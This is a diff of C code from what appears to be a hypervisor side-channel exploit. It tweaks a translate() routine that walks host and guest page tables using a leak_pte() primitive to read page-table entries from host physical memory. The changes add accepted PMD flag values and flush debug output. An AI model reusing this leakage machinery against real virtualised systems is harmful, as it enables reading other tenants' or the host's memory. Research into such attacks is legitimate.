@@ -88,6 +88,8 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 	return pte;
 }
 
+// TODO optimize: give translate{,_tdp} access to {h,g}direct_map, to skip those traslations.
+
 hpa_t translate(hpa_t base, hva_t va, hpa_t cr3)
 {
 	#define RETRY_THRES 3
@@ -153,7 +155,7 @@ retry_pmd:
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
 	if (verbose == 1) { printf("pmd %10lx ", pmd); fflush(stdout); }
-	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7))) {
+	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3))) {
 		if (verbose == 1) printf("\n\t--> ");
 		goto retry_pmd;
 	}
@@ -208,7 +210,7 @@ retry_gpgd:
 	tries_gpgd++;
 	if (verbose >= 2) dump(gpgd_pa);
 	pte_t gpgd = leak_pte(base, gpgd_pa);
-	if (verbose == 1) printf("\n\t\\--> \\ gpgd %10lx", gpgd);
+	if (verbose == 1) { printf("\n\t\\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
 	if (verbose >= 2) dump(gpgd);
 	if ((gpgd & 0xfff) != 0x067)
 		goto retry_gpgd;
@@ -229,7 +231,7 @@ retry_gpud:
 	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
 	if (verbose >= 2) dump(pud_pa);
 	pte_t gpud = leak_pte(base, pud_pa);
-	if (verbose == 1) printf("\t      \\ gpud %10lx", gpud);
+	if (verbose == 1) { printf("\t      \\ gpud %10lx", gpud); fflush(stdout); }
 	if (verbose >= 2) dump(gpud);
 	if ((gpud & 0xffb) != 0x063) {
 		if (verbose == 1) printf("\n");
@@ -261,7 +263,7 @@ retry_gpmd:
 	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
 	if (verbose >= 2) dump(pmd_pa);
 	pte_t gpmd = leak_pte(base, pmd_pa);
-	if (verbose == 1) printf("\t       \\ gpmd %10lx", gpmd);
+	if (verbose == 1) { printf("\t       \\ gpmd %10lx", gpmd); fflush(stdout); }
 	if (verbose >= 2) dump(gpmd);
 	if ((gpmd & 0xf7b) != 0x063) {
 		if (verbose == 1) printf("\n");
@@ -293,7 +295,7 @@ retry_gpte:
 	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
 	if (verbose >= 2) dump(pte_pa);
 	pte_t gpte = leak_pte(base, pte_pa);
-	if (verbose == 1) printf("\t        \\ gpte %10lx", gpte);
+	if (verbose == 1) { printf("\t        \\ gpte %10lx", gpte); fflush(stdout); }
 	if (verbose >= 2) dump(gpte);
 	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825)) {
 		if (verbose == 1) printf("\n");
